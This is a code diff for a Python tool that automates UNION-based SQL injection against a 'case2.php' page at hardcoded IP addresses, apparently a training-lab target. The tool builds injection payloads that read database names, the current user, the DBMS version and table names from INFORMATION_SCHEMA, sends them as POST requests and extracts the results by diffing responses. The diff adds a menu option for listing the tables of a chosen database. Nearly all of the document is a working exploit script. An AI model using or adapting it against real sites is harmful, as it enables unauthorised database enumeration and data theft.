@@ -14,7 +14,7 @@ def get_sqli_info(payload):
 		{"payload":"SCHEMA_NAME",	"source":"FROM INFORMATION_SCHEMA.SCHEMATA"}, #Databases
 		{"payload":"user()",		"source":""}, #User
 		{"payload":"@@version",		"source":""}, # DBMS Version
-        {"payload":"TABLE_NAME",    "source": "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE "}
+        {"payload":"TABLE_NAME",    "source": "FROM INFORMATION_SCHEMA.TABLES"}
 
 	]
     cont = 0
@@ -88,12 +88,16 @@ class SQLI:
         self.sqli_payload = sqli_payload
         self.headers = read_headers_file("./headers.txt")
         self.data = get_sqli_info(sqli_payload)
+        self.automate()
+    
+    def automate(self):
+        for i in range(3):
+            self.data[i] = get_dbms_data_values(self, i).data[i]
 
 url = "http://"+"94.237.53.219:39961/case2.php"
 headers = read_headers_file("./headers.txt")
 payload = {"id": "1"}
 sqli_payload = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
-sqli = SQLI(url, payload, sqli_payload) # GLOBAL OBJECT
 
 #WORKING CODE
 """
@@ -110,18 +114,31 @@ result = html_diff(response1,response3)
 
 add_values_to_data_payload(result, aux_payloads[0])
 """
-
+def show_tables_from_specific_database(sqli):
+    #Get databases
+    print("Available databases:")
+    for db in sqli.data[0]['value']:
+        print(f"\033[37m- {db}\033[0m")
+    #Choose database
+    option = str(input("Choose database:\t\033[0m"))
+    while option not in sqli.data[0]['value']:
+        option = str(input("Invalid database. Choose Database:\t\033[0m"))
+    #Set payload to get tables from specific database
+    sqli.data[3]['payload'] = sqli.sqli_payload.replace("payload", "TABLE_NAME").replace("source", "FROM INFORMATION_SCHEMA.TABLES")
+    sqli.data[3]['payload'] = sqli.data[3]['payload'].replace("INFORMATION_SCHEMA.TABLES", f"INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{option}'")
+    #Obtener tablas
+    sqli.data[3] = get_dbms_data_values(sqli,3).data[3]
+    return sqli
+    
 #------------
-def set_database_names(sqli, data_index=0):
+def get_dbms_data_values(sqli, data_index=0):
     try:
         response1 = post_request(sqli.url, sqli.payload, sqli.headers).text
-        aux_payloads = get_sqli_info(sqli.sqli_payload)
-        database_payload = string_to_json(aux_payloads[data_index]['payload'])
-        response2 = post_request(sqli.url, database_payload, sqli.headers).text
+        dbms_data_payload = string_to_json(sqli.data[data_index]['payload'])
+        response2 = post_request(sqli.url, dbms_data_payload, sqli.headers).text
         result = html_diff(response1,response2)
-        value = add_values_to_data_payload(result, aux_payloads[data_index])
+        value = add_values_to_data_payload(result, sqli.data[data_index])
         sqli.data[data_index] = value
-        print(f"\033[32mValue found: \033[37m{sqli.data[data_index]['value']}\033[0m")
         return sqli
     except requests.RequestException as e:
         print(f"\033[31mError during request: {e}\033[0m")
@@ -139,14 +156,16 @@ def menu(option, sqli):
         sqli.payload = string_to_json(new_payload)
     elif option == 20:
         try:
-            sqli.data[0] = set_database_names(sqli).data[0]
+            sqli.data[0] = get_dbms_data_values(sqli).data[0]
         except Exception as e:
             print(f"\033[31mError setting database names: {e}\033[0m")
             result = -1 
     elif option == 21:
-        sqli.data[1] = set_database_names(sqli,1).data[1]
+        sqli.data[1] = get_dbms_data_values(sqli,1).data[1]
     elif option == 22:
-        sqli.data[2] = set_database_names(sqli,2).data[2]
+        sqli.data[2] = get_dbms_data_values(sqli,2).data[2]
+    elif option == 30:
+        sqli.data[3] = show_tables_from_specific_database(sqli).data[3]
     if result == 0:
         run(sqli)
 
@@ -169,15 +188,24 @@ def run(sqli):
     print(f"--------------")
     print("10)\tSet URL")
     print("11)\tSet Payload\n")
-    print("20)\tGet Database Name")
-    print("21)\tGet User Name")
-    print("22)\tGet DBMS Version")
+    # Automation options
+    #print("20)\tGet Database Name")
+    #print("21)\tGet User Name")
+    #print("22)\tGet DBMS Version")
+    print("30)\tShow tables from specific database")
+    print("31)\tShow columns from specific table (Not implemented)")
     print("\n0) Exit")
     
     option = int(input("Choose option:\t"))
     menu(option, sqli)
 
 def main ():
+    #DEFAULT VALUES
+    url = "http://"+"83.136.252.32:52854/case2.php"
+    headers = read_headers_file("./headers.txt")
+    payload = {"id": "1"}
+    sqli_payload = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
+    
     sqli = SQLI(url, payload, sqli_payload)
     run(sqli)
 main()
